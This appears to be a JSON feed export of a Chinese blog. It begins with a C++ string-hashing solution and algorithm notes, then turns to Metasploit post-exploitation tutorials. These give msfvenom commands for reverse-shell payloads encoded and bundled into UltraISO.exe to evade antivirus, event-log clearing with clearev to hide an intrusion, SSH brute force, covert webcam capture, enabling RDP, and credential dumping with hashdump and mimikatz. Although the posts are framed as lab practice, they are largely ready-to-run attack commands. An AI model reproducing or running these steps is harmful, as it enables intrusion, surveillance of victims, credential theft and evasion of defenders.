class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include &lt;cstdio&gt;</span><br><span class=\"line\">#include &lt;cstring&gt;</span><br><span class=\"line\">#include &lt;algorithm&gt;</span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\">typedef unsigned long long ull;</span><br><span class=\"line\">ull base=131;</span><br><span class=\"line\">ull po[100010],hs[100010*100];</span><br><span class=\"line\">char s1[100010],s2[100010*100];</span><br><span class=\"line\">int n,ans=1,T;</span><br><span class=\"line\">ull geth(int l,int r)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    return (ull)hs[r]-po[r-l+1]*hs[l-1];</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    freopen(&quot;oulipo.in&quot;,&quot;r&quot;,stdin);</span><br><span class=\"line\">    freopen(&quot;oulipo.out&quot;,&quot;w&quot;,stdout);</span><br><span class=\"line\">    po[0]=1;</span><br><span class=\"line\">    for (int i=1;i&lt;=10010-5;i++)</span><br><span class=\"line\">        po[i]=po[i-1]*base;</span><br><span class=\"line\">    scanf(&quot;%d&quot;,&amp;T);</span><br><span class=\"line\">    while(T--)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        scanf(&quot;%s%s&quot;,s1+1,s2+1);</span><br><span class=\"line\">        int l1=strlen(s1+1),l2=strlen(s2+1);</span><br><span class=\"line\">        ull a1=0,ans=0;</span><br><span class=\"line\">        for (int i=1;i&lt;=l1;i++)</span><br><span class=\"line\">            a1=a1*base+(ull)s1[i];</span><br><span class=\"line\">        for (int i=1;i&lt;=l2;i++)</span><br><span class=\"line\">            hs[i]=hs[i-1]*base+s2[i];</span><br><span class=\"line\">        for (int i=1;i+l1-1&lt;=l2;i++)</span><br><span class=\"line\">            if (a1==geth(i,i+l1-1))</span><br><span class=\"line\">                ans++;</span><br><span class=\"line\">        printf(&quot;%d\\n&quot;,ans);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"hash好像可以暴力水过很多字符串算法\"><a class=\"anchor\" href=\"#hash好像可以暴力水过很多字符串算法\">#</a> hash 好像可以暴力水过很多字符串算法。。</h2>\n<p>1、kmp</p>\n<p>问题：给两个字符串 S1，S2，求 S2 是否是 S1 的子串，并求 S2 在 S1 中出现的次数</p>\n<p>把 S2 Hash 出来，在 S1 里找所有长度为 | S2|</p>\n<p>2、AC 自动机</p>\n<p>问题：给 N 个单词串，和一个文章串，求每个单词串是否是文章串的子串，并求每个单词在文章中出现的次数。</p>\n<p>把每一个单词 hash 成整数，再把文章的每一个子串 hash 成整数，接下来只需要进行整数上的查找即可。</p>\n<p>复杂度：O (|A|2+|S|)</p>\n<p>用 AC 自动机可以做到 O (|A|+|S|)</p>\n<p>3、后缀数组</p>\n<p>问题：给两个字符串 S1,S2，求它们的最长公共子串的长度。</p>\n<p>将 S1 的每一个子串都 hash 成一个整数，将 S2 的每一个子串都 hash 成一个整数</p>\n<p>两堆整数，相同的配对，并且找到所表示的字符串长度最大的即可。</p>\n<p>复杂度：O (|S1|2+|S2|2)</p>\n<p>用后缀数组可以优化到 O (|S|log|S|)</p>\n<p>4、马拉车</p>\n<p>问题：给一个字符串 S，求 S 的最长回文子串。</p>\n<p>先求子串长度位奇数的，再求偶数的。枚举回文子串的中心位置，然后二分子串的长度，直到找到一个该位置的最长回文子串，不断维护长度最大值即可。</p>\n<p>复杂度：O (|S|log|S|)</p>\n<p>用 manacher 可以做到 O (|S|)</p>\n<p>5、扩展 kmp</p>\n<p>问题：给一个字符串 S，求 S 的每个后缀与 S 的最长公共前缀</p>\n<p>枚举每一个后缀的起始位置，二分长度，求出每个后缀与 S 的最长公共前缀。</p>\n<p>复杂度：O (|S|log|S|)</p>\n<p>用 extend-kmp 可以做到 O (|S|)</p>\n",
            "tags": []
        },
        {
            "id": "https://mangpumo.github.io/2023/01/12/msf%E6%B8%85%E7%90%86%E4%BA%8B%E4%BB%B6%E6%97%A5%E5%BF%97/",
            "url": "https://mangpumo.github.io/2023/01/12/msf%E6%B8%85%E7%90%86%E4%BA%8B%E4%BB%B6%E6%97%A5%E5%BF%97/",
            "title": "msf清理事件日志",
            "date_published": "2023-01-12T14:18:52.000Z",
            "content_html": "<p>再进入肉鸡执行一些操作时，windows 下记录的操作日志可在日志查看器中进行查看，可以通过运行 eventvwr 命令打开。包括了应用程序、系统、安全等模块的日志，为了不让其查到自己或知道自己的操作，则可以使用 meterpreter 的 clearev 命令来清除其日志。未清除日志前可查看系统记录的一些处理信息。</p>\n<p>![1645511582659](03 msf 清理事件日志.assets/1645511582659.png)</p>\n<p>然后在 meterpreter 下执行 clearev 命令，可以看到清除提示，分别清除了应用程序，系统和安全模块的日志记录。</p>\n<p>clearev      清理日志</p>\n<p>![1645511593151](03 msf 清理事件日志.assets/1645511593151.png)</p>\n<p>（注意 使用 clearev 命令时 需要获得靶机的 system  权限）</p>\n",
            "tags": []
        },
        {
            "id": "https://mangpumo.github.io/2023/01/12/msf%E5%85%8D%E6%9D%80%E7%BC%96%E7%A0%81/",
            "url": "https://mangpumo.github.io/2023/01/12/msf%E5%85%8D%E6%9D%80%E7%BC%96%E7%A0%81/",
            "title": "msf免杀编码",
            "date_published": "2023-01-12T14:18:18.000Z",
            "content_html": "<p>杀软是如何检测出恶意代码的？<br>\n特征码、启发式恶意软件检查和行为。<br>\n免杀是做什么？<br>\n对特征进行混淆，打乱代码，避免杀毒软件查杀<br>\n免杀的基本方法有哪些？<br>\n自编码处理  自捆绑 + 编码  多重编码   接口下载式  签名伪装式</p>\n<p>针对杀毒软件的基本检测方法，我们可有以下几种方法实现免杀：</p>\n<p>改变特征码<br>\n改变行为<br>\n其它</p>\n<p>由于 msf 被各大安全厂商盯的比较紧，所以这些常规的方法免杀效果肯定是比较差的，但有时把一两种常规方法稍微结合一下就能达到比较好的免杀效果</p>\n<p>要用到的在线查毒工具 virscan 提供</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudmlyc2Nhbi5vcmcv\">https://www.virscan.org/</span></p>\n<h1 id=\"一-不处理payload直接生成样本进行检测\"><a class=\"anchor\" href=\"#一-不处理payload直接生成样本进行检测\">#</a> 一、不处理 payload 直接生成样本进行检测</h1>\n<p>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.110.32 LPORT=4456 -f exe -o payload1.exe</p>\n<p>![1645511560404](02 msf 编码免杀.assets/1645511560404.png)</p>\n<p>进行查毒有 41% 的杀毒软件报毒了</p>\n<p>具体查毒链接：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9yLnZpcnNjYW4ub3JnL2xhbmd1YWdlL2VuL3JlcG9ydC8yN2VhNTNiYWI0NGUwYTAyM2I1N2MyNzk5MWYwMmNmOQ==\">https://r.virscan.org/language/en/report/27ea53bab44e0a023b57c27991f02cf9</span></p>\n<p>![1645511550808](02 msf 编码免杀.assets/1645511550808.png)</p>\n<h1 id=\"二-msf自编码处理payload生成样本进行检测\"><a class=\"anchor\" href=\"#二-msf自编码处理payload生成样本进行检测\">#</a> 二、 MSF 自编码处理 payload 生成样本进行检测</h1>\n<p>首先我们输入   msfvenom --list encoders   查看可以用编码模块</p>\n<p>![1645511543145](02 msf 编码免杀.assets/1645511543145.png)</p>\n<p>我们使用  x86/shikata_ga_nai 模块 免杀中使用频率最高的一个编码器</p>\n<p>msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai HOST=192.168.110.110  LPORT=4456 -f exe -o payload1.exe</p>\n<p>进行查毒有 37% 的杀毒软件报毒了</p>\n<p>![1645511533351](02 msf 编码免杀.assets/1645511533351.png)</p>\n<h1 id=\"三-msf自捆绑处理payload生成样本进行检测\"><a class=\"anchor\" href=\"#三-msf自捆绑处理payload生成样本进行检测\">#</a> 三、MSF 自捆绑处理 payload 生成样本进行检测</h1>\n<p>使用 msfvenom 的 - x 参数可以指定一个可执行文件，将 payload 与其捆绑</p>\n<p>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.110.110 LPORT=4456 -x UltraISO.exe -f exe -o payload2.exe</p>\n<p>![1645511525813](02 msf 编码免杀.assets/1645511525813.png)</p>\n<p>进行查毒有 37% 的杀毒软件报毒了</p>\n<p>![1645511516751](02 msf 编码免杀.assets/1645511516751.png)</p>\n<h1 id=\"四-msf自捆绑编码处理payload生成样本进行检测\"><a class=\"anchor\" href=\"#四-msf自捆绑编码处理payload生成样本进行检测\">#</a> 四、MSF 自捆绑 + 编码处理 payload 生成样本进行检测</h1>\n<p>结合第二种，第三种。编码方式我们再次生成样本</p>\n<p>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.110.110 LPORT=4456 -e x86/shikata_ga_nai -x UltraISO.exe  -i 10 -f exe -o payload3.exe</p>\n<p>![1645511507586](02 msf 编码免杀.assets/1645511507586.png)</p>\n<p>进行查毒有 31% 的杀毒软件报毒了</p>\n<p>![1645511497457](02 msf 编码免杀.assets/1645511497457.png)</p>\n<p>那我们继续增加编码次数</p>\n<p>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.110.110 LPORT=4456 -e x86/shikata_ga_nai -x UltraISO.exe  -i 20 -f exe -o payload4.exe</p>\n<p>进行查毒有 27% 的杀毒软件报毒了！</p>\n<p>![1645511487704](02 msf 编码免杀.assets/1645511487704.png)</p>\n<h1 id=\"五-msf多重编码payload生成样本进行检测\"><a class=\"anchor\" href=\"#五-msf多重编码payload生成样本进行检测\">#</a> 五、MSF 多重编码 payload 生成样本进行检测</h1>\n<p>通过管道，让 msfvenom 用不同编码器反复编码进行混淆。使用管道让 msfvenom 对攻击载荷多重编码，先用 shikata_ga_nai 编码 10 次，接着来 10 次的 alpha_upper 编码，再来 10 次的 countdown 编码，最后才生成以 payload5.exe 为模板的可执行文件。</p>\n<p>msfvenom  -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 10 LHOST=192.168.110.110 LPORT=4456 -f raw | msfvenom -e x86/alpha_upper -i 10 -f raw | msfvenom -e x86/countdown -i 10 -x UltraISO.exe -f exe -o payload5.exe</p>\n<h1 id=\"六-生成shellcode使用c语言调用\"><a class=\"anchor\" href=\"#六-生成shellcode使用c语言调用\">#</a> 六、 生成 Shellcode 使用 C 语言调用</h1>\n<p>1、直接在 linux 中利用 msf 的 meterpreter 生成的文件以.c 形式文件存储，得到机器码。命令：</p>\n<p>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.110.110 LPORT=4456 -f c &gt;c0001.c</p>\n<p>![1645511458128](02 msf 编码免杀.assets/1645511458128.png)</p>\n<p>2、改 c 文件，并编译，并加壳</p>\n<p>![1645511469800](02 msf 编码免杀.assets/1645511469800.png)</p>\n<p>随便写一个 hello world</p>\n<p>main() {<br>\nprintf(&quot;hello world\\n&quot;);<br>\n}</p>\n<p>然后编译 并加壳</p>\n<p>vmp 加壳工具</p>\n",
            "tags": []
        },
        {
            "id": "https://mangpumo.github.io/2023/01/12/msf%E8%BE%85%E5%8A%A9%E6%A8%A1%E5%9D%97/",
            "url": "https://mangpumo.github.io/2023/01/12/msf%E8%BE%85%E5%8A%A9%E6%A8%A1%E5%9D%97/",
            "title": "msf辅助模块",
            "date_published": "2023-01-12T14:10:07.000Z",
            "content_html": "<p>说明：我们知道 msf 辅助模块有上千个，主要用于信息搜集阶段，功能包括扫描、口令猜解、敏感信息嗅探、FUZZ 测试发掘漏洞、实施网络协议欺骗等</p>\n<h1 id=\"一-怎么查询-auxiliary辅助模块\"><a class=\"anchor\" href=\"#一-怎么查询-auxiliary辅助模块\">#</a> 一、怎么查询 Auxiliary 辅助模块</h1>\n<p>我们可以通过以下命令查询所有 Auxiliary 辅助模块</p>\n<p>use auxiliary/ 或   show auxiliary</p>\n<h1 id=\"二-auxiliary辅助模块分类\"><a class=\"anchor\" href=\"#二-auxiliary辅助模块分类\">#</a> 二、 Auxiliary 辅助模块分类</h1>\n<hr>\n<h4 id=\"admin\"><a class=\"anchor\" href=\"#admin\">#</a> admin</h4>\n<hr>\n<p>/admin/android</p>\n<p>/admin/http</p>\n<p>/admin/mysql/</p>\n<p>/admin/oracle/</p>\n<p>/admin/vmware/</p>\n<p>/admin/smb/</p>\n<hr>\n<h4 id=\"dos\"><a class=\"anchor\" href=\"#dos\">#</a> dos</h4>\n<hr>\n<p>/dos/android/</p>\n<p>/dos/http/</p>\n<p>/dos/cisco/</p>\n<p>/dos/dns/</p>\n<p>/dos/smb/</p>\n<p>/dos/windows/ftp/</p>\n<hr>\n<h4 id=\"fuzzers\"><a class=\"anchor\" href=\"#fuzzers\">#</a> fuzzers</h4>\n<hr>\n<p>/fuzzers/http/</p>\n<p>/fuzzers/smb/</p>\n<p>/gather/</p>\n<hr>\n<h4 id=\"scanner\"><a class=\"anchor\" href=\"#scanner\">#</a> scanner</h4>\n<hr>\n<p>/scanner/portscan/</p>\n<p>/scanner/ftp/</p>\n<p>/scanner/http/</p>\n<p>/scanner/ssh/</p>\n<p>/scanner/smb/</p>\n<p>/scanner/vmware/</p>\n<p>/scanner/vnc/</p>\n<p>/scanner/telnet/</p>\n<p>/scanner/msyql/</p>\n<p>/scanner/ntp/</p>\n<p>/scanner/openvas/</p>\n<p>/scanner/sap/</p>\n<h4 id=\"server\"><a class=\"anchor\" href=\"#server\">#</a> server</h4>\n<p>/server/</p>\n<h1 id=\"三-通过分类查询指定模块\"><a class=\"anchor\" href=\"#三-通过分类查询指定模块\">#</a> 三、通过分类查询指定模块</h1>\n<p>通过 search 查询指定模块</p>\n<p>search type:auxiliary name:smb</p>\n<p>type： 后门跟的的模块类型   name ： 后门跟的就是要搜的模块名</p>\n<h1 id=\"四-怎么调用模块\"><a class=\"anchor\" href=\"#四-怎么调用模块\">#</a> 四、怎么调用模块</h1>\n<p>我们调一个 smb 模块演示</p>\n<p>1 查询与 SMB\t相关的辅助模块</p>\n<p>search type:auxiliary name:smb</p>\n<p>2 加载一个 ms17_010 探测模块</p>\n<p>use auxiliary/scanner/smb/smb_ms17_010</p>\n<p>3 查看载入模块需要配置的参数</p>\n<p>show options</p>\n<p>![1645511393570](01 msf 辅助模块.assets/1645511393570.png)</p>\n<p>set RHOSTS 192.168.110.110   (设定目标 IP)</p>\n<p>set THREADS 10    （如果觉得探测过慢可以增加线程，根据电脑实际性能来不要配置太多 个人建议最大 10）</p>\n<p>run （执行探测）</p>\n<p>![1645511404119](01 msf 辅助模块.assets/1645511404119.png)</p>\n<p>![1645511415106](01 msf 辅助模块.assets/1645511415106.png)</p>\n<h1 id=\"五-更多\"><a class=\"anchor\" href=\"#五-更多\">#</a> 五、更多</h1>\n<p>1 whois 查看域名或 IP 信息  （hu yi zi）</p>\n<p>whois <span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5iYWlkdS5jb20=\">www.baidu.com</span></p>\n<p>whois 192.168.0.1</p>\n<p>2  利用辅助模块查找邮箱</p>\n<p>use auxiliary/gather/search_email_collector</p>\n<p>3 DNS 枚举，使用 auxiliary 模块下的 DNS 枚举模块：</p>\n<p>use auxiliary/gather/enum_dns</p>\n<p>4 ssh 爆破，使用 auxiliary 模块下的 ssh_login</p>\n<p>use /auxiliary/scanner/ssh/ssh_login</p>\n<p>set RHOSTS 192.168.1.92   (设定目标 IP)<br>\n set USERNAME root    （设定 ssh 登陆账户）<br>\nset PASS_FILE /kevin/ssh_passwd.txt   （设定暴力字典）<br>\nset THREADS 100           (线程设置为 100)<br>\n show options                   (查看更改后的参数) 12345</p>\n<p>run   开始爆破</p>\n",
            "tags": []
        },
        {
            "id": "https://mangpumo.github.io/2023/01/12/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E8%B0%83%E6%91%84%E5%83%8F%E5%A4%B4/",
            "url": "https://mangpumo.github.io/2023/01/12/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E8%B0%83%E6%91%84%E5%83%8F%E5%A4%B4/",
            "title": "后渗透之调摄像头",
            "date_published": "2023-01-12T13:41:34.000Z",
            "content_html": "<h1 id=\"一-环境准备\"><a class=\"anchor\" href=\"#一-环境准备\">#</a> 一、环境准备</h1>\n<p>1 MSF-Metasploit Framework</p>\n<p>2 一台 windiows 靶机</p>\n<p>3 一台安卓设备，没有可以使用模拟器</p>\n<h1 id=\"二-实战\"><a class=\"anchor\" href=\"#二-实战\">#</a> 二、实战</h1>\n<p>靶机获取到 meterpreter 后我们可以使用  webcam 模块实现调用软，硬件摄像头</p>\n<p>webcam 模块支持命令</p>\n<table>\n<thead>\n<tr>\n<th>id</th>\n<th>模块名</th>\n<th>解释</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>1</td>\n<td><strong>webcam_list</strong></td>\n<td>列出靶机中的所有软，硬件摄像头列表，并编号</td>\n</tr>\n<tr>\n<td>2</td>\n<td><strong>webcam_snap</strong></td>\n<td>可调用单个软，硬件摄像头拍照，默认调用第一个摄像头</td>\n</tr>\n<tr>\n<td>3</td>\n<td><strong>webcam_stream</strong></td>\n<td>可调用单个软，硬件摄像头直播，默认调用第一个摄像头</td>\n</tr>\n</tbody>\n</table>\n<p>1  webcam_list</p>\n<p><img data-src=\"%E4%B8%80%E3%80%81%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87.assets/1644494100592.png\" alt=\"1644494100592\"></p>\n<p>2 webcam_snap  调用单个软，硬件摄像头拍照</p>\n<table>\n<thead>\n<tr>\n<th>id</th>\n<th>参数</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>1</td>\n<td>-h</td>\n<td>显示帮助</td>\n</tr>\n<tr>\n<td>2</td>\n<td>-i</td>\n<td>-i 1 “1” 代表调用摄像头编号</td>\n</tr>\n<tr>\n<td>3</td>\n<td>-p</td>\n<td>-p  /root &quot;root&quot; 设置存储路径</td>\n</tr>\n<tr>\n<td>4</td>\n<td>-q</td>\n<td>-q  100  &quot;100&quot; 表示存储图片的质量默认为 50</td>\n</tr>\n<tr>\n<td>5</td>\n<td>-v</td>\n<td>-v  false   -v 2 个参数  true 和  false   这个参数表示拍照后自动打开，默认参数为 true</td>\n</tr>\n</tbody>\n</table>\n<p><img data-src=\"%E4%B8%80%E3%80%81%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87.assets/1644494089950.png\" alt=\"1644494089950\"></p>\n<p>3 webcam_stream  调用单个软，硬件摄像头直播</p>\n<table>\n<thead>\n<tr>\n<th>id</th>\n<th>参数</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>1</td>\n<td>-h</td>\n<td>显示帮助</td>\n</tr>\n<tr>\n<td>2</td>\n<td>-d</td>\n<td>-d 100  &quot;100&quot;=100 秒   设置流持续时间为 100 秒   默认为 1800</td>\n</tr>\n<tr>\n<td>3</td>\n<td>-i</td>\n<td>-i 1 “1” 代表调用摄像头编号</td>\n</tr>\n<tr>\n<td>4</td>\n<td>-q</td>\n<td>-q 100 “100” 指流质量 默认为 50</td>\n</tr>\n<tr>\n<td>5</td>\n<td>-s</td>\n<td>-s live “live” 指流文件路径  默认输出在当前目录（注意目录不存在不会自动创建）</td>\n</tr>\n<tr>\n<td>7</td>\n<td>-f</td>\n<td>-f live “live” 指播放文件的存储地址  默认输出在当前目录</td>\n</tr>\n<tr>\n<td>8</td>\n<td>-v</td>\n<td>-v  false   -v 2 个参数  true 和  false   这个参数表示拍照后自动打开，默认参数为 true</td>\n</tr>\n</tbody>\n</table>\n",
            "tags": []
        },
        {
            "id": "https://mangpumo.github.io/2023/01/12/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E8%BF%9C%E7%A8%8B%E7%9B%91%E6%8E%A7Windows/",
            "url": "https://mangpumo.github.io/2023/01/12/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E8%BF%9C%E7%A8%8B%E7%9B%91%E6%8E%A7Windows/",
            "title": "后渗透之远程监控Windows",
            "date_published": "2023-01-12T13:33:52.000Z",
            "content_html": "<h1 id=\"一-环境准备\"><a class=\"anchor\" href=\"#一-环境准备\">#</a> 一、环境准备</h1>\n<h4 id=\"1-rdesktop\"><a class=\"anchor\" href=\"#1-rdesktop\">#</a> 1 rdesktop</h4>\n<p>在线安装  rdesktop</p>\n<hr>\n<p>Debian,Ubuntu,kali 下使用以下命令</p>\n<p>apt-get install rdesktop</p>\n<hr>\n<p>Centos/RedHat 可以通过 yum 命令</p>\n<p>yum -y install rdesktop</p>\n<h4 id=\"2-一台windiows靶机没有物理电脑可以使用虚拟机代替\"><a class=\"anchor\" href=\"#2-一台windiows靶机没有物理电脑可以使用虚拟机代替\">#</a> 2 一台 windiows 靶机（没有物理电脑可以使用虚拟机代替）</h4>\n<h4 id=\"3-msf-metasploit-framework\"><a class=\"anchor\" href=\"#3-msf-metasploit-framework\">#</a> 3 MSF-Metasploit Framework</h4>\n<h1 id=\"二-实战\"><a class=\"anchor\" href=\"#二-实战\">#</a> 二、实战</h1>\n<p>1 使用 rdesktop 远程控制</p>\n<p>说明：rdesktop 是 linux 下支持 Windows 远程桌面连接的客户端程序，在 linux 系统下可通过它远程访问 Windows 桌面，支持多种版本。rdesktop 是 sourceforge 下支持 GPL 协议的一个开源项目，采用 RDP（Remote Desktop Protocol, 远程桌面协议），几乎可以连接 windows 的所有版本</p>\n<p>rdesktop 常用参数</p>\n<table>\n<thead>\n<tr>\n<th>id</th>\n<th>参数</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>1</td>\n<td>-u</td>\n<td>账户名</td>\n</tr>\n<tr>\n<td>2</td>\n<td>-p</td>\n<td>密码</td>\n</tr>\n<tr>\n<td>3</td>\n<td>-a 16</td>\n<td>指使用 16 位色显示远程画面</td>\n</tr>\n<tr>\n<td>4</td>\n<td>-f</td>\n<td>全屏模式（用<strong> Ctrl+Alt+Enter</strong> 组合键退出全屏）</td>\n</tr>\n<tr>\n<td>5</td>\n<td>-g</td>\n<td>设置分辨率 如 :   -g 1024x768</td>\n</tr>\n<tr>\n<td>6</td>\n<td>rdesktop -h</td>\n<td>查看 rdesktop 使用帮助</td>\n</tr>\n</tbody>\n</table>\n<p>rdesktop -u 用户名 -p  密码  -f   IP</p>\n<p>rdesktop -u mb -p 123456 -f  -g 1024x720 192.168.110.24</p>\n<p>如果远程计算机没有启动远程功能我们可以在 meterpreter 中输入</p>\n<p>启动远程桌面协议：run post/windows/manage/enable_rdp</p>\n<hr>\n<p>2 通过 vnc 远程</p>\n<p>![1644493726723](26 后渗透远程控制.assets/1644493726723.png)</p>\n",
            "tags": []
        },
        {
            "id": "https://mangpumo.github.io/2023/01/12/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E8%8E%B7%E5%8F%96%E7%99%BB%E9%99%86%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81Windows/",
            "url": "https://mangpumo.github.io/2023/01/12/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E8%8E%B7%E5%8F%96%E7%99%BB%E9%99%86%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81Windows/",
            "title": "后渗透之获取登陆账号密码Windows",
            "date_published": "2023-01-12T13:29:57.000Z",
            "content_html": "<h1 id=\"一-环境准备\"><a class=\"anchor\" href=\"#一-环境准备\">#</a> 一、环境准备</h1>\n<p>1 MSF-Metasploit Framework</p>\n<p>2 一台 windiows 靶机</p>\n<h1 id=\"二-实战\"><a class=\"anchor\" href=\"#二-实战\">#</a> 二、实战</h1>\n<p>首先获得一个有 SYSTEM 权限的 meterpreter</p>\n<p><img data-src=\"%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E8%8E%B7%E5%8F%96%E7%99%BB%E5%BD%95%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81.assets/1644493974746.png\" alt=\"1644493974746\"></p>\n<p>1 抓取自动登录账户密码</p>\n<p>2 导出 SAM 数据库本地账户密码文件</p>\n<p>3 导出密码哈希</p>\n<p>4 使用 kiwi 模块获取</p>\n<hr>\n<p>1  很多人喜欢给在计算机设置自动登录 我们可以通过抓取自动登录的账户密码</p>\n<p>run windows/gather/credentials/windows_autologin</p>\n<p>如果提示这证明本机并没有配置自动登录</p>\n<p><img data-src=\"%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E8%8E%B7%E5%8F%96%E7%99%BB%E5%BD%95%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81.assets/1644493985741.png\" alt=\"1644493985741\"></p>\n<p>2  还可以通过导出 SAM 数据库中的本地用户账号（注意需要提权到 SYSTEM）</p>\n<p>run post/windows/gather/smart_hashdump</p>\n<p><img data-src=\"%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E8%8E%B7%E5%8F%96%E7%99%BB%E5%BD%95%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81.assets/1644493996549.png\" alt=\"1644493996549\"></p>\n<table>\n<thead>\n<tr>\n<th>用户名</th>\n<th>SID</th>\n<th>LM 哈希:</th>\n<th>NTLM 哈希 1:::</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>mb</td>\n<td>1000</td>\n<td>aad3b435b51404eeaad3b435b51404ee</td>\n<td>32ed87bdb5fdc5e9cba88547376818d4</td>\n</tr>\n</tbody>\n</table>\n<p><img data-src=\"%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E8%8E%B7%E5%8F%96%E7%99%BB%E5%BD%95%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81.assets/1644494007420.png\" alt=\"1644494007420\"></p>\n<p>3  使用  hashdump 获取密码（注意需要提权到 SYSTEM 才能使用）</p>\n<p>终端内输入  run hashdump</p>\n<p><img data-src=\"%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E8%8E%B7%E5%8F%96%E7%99%BB%E5%BD%95%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81.assets/1644494019182.png\" alt=\"1644494019182\"></p>\n<p>使用在线解析工具  <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY21kNS5jb20v\">https://www.cmd5.com/</span></p>\n<p>NTLM 哈希 例子：32ed87bdb5fdc5e9cba88547376818d4</p>\n<p><img data-src=\"%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E8%8E%B7%E5%8F%96%E7%99%BB%E5%BD%95%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81.assets/1644494029236.png\" alt=\"1644494029236\"></p>\n<p>4  使用 load kiwi（使用 kiwi 模块需要 system 权限）</p>\n<p>kiwi_cmd 模块可以让我们使用 mimikatz 的全部功能， mimikatz 的命令直接在 kiwi_cmd 里直接使用</p>\n<p>5.1 终端输入  load kiwi</p>\n<p>5.2 creds_all  直接获取密码</p>\n<p><img data-src=\"%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E8%8E%B7%E5%8F%96%E7%99%BB%E5%BD%95%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81.assets/1644494040171.png\" alt=\"1644494040171\"></p>\n<p>5.3 使用  kiwi_cmd sekurlsa::logonpasswords  获取密码</p>\n<p><img data-src=\"%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E8%8E%B7%E5%8F%96%E7%99%BB%E5%BD%95%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81.assets/1644494050257.png\" alt=\"1644494050257\"></p>\n<table>\n<thead>\n<tr>\n<th>ID</th>\n<th>kiwi 参数和描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>1</td>\n<td>creds_all：列举所有凭据</td>\n</tr>\n<tr>\n<td>2</td>\n<td>creds_kerberos：列举所有 kerberos 凭据</td>\n</tr>\n<tr>\n<td>3</td>\n<td>creds_msv：列举所有 msv 凭据</td>\n</tr>\n<tr>\n<td>4</td>\n<td>creds_ssp：列举所有 ssp 凭据</td>\n</tr>\n<tr>\n<td>5</td>\n<td>creds_tspkg：列举所有 tspkg 凭据</td>\n</tr>\n<tr>\n<td>6</td>\n<td>creds_wdigest：列举所有 wdigest 凭据</td>\n</tr>\n<tr>\n<td>7</td>\n<td>dcsync：通过 DCSync 检索用户帐户信息</td>\n</tr>\n<tr>\n<td>8</td>\n<td>dcsync_ntlm：通过 DCSync 检索用户帐户 NTLM 散列、SID 和 RID</td>\n</tr>\n<tr>\n<td>9</td>\n<td>golden_ticket_create：创建黄金票据</td>\n</tr>\n<tr>\n<td>10</td>\n<td>kerberos_ticket_list：列举 kerberos 票据</td>\n</tr>\n<tr>\n<td>11</td>\n<td>kerberos_ticket_purge：清除 kerberos 票据</td>\n</tr>\n<tr>\n<td>12</td>\n<td>kerberos_ticket_use：使用 kerberos 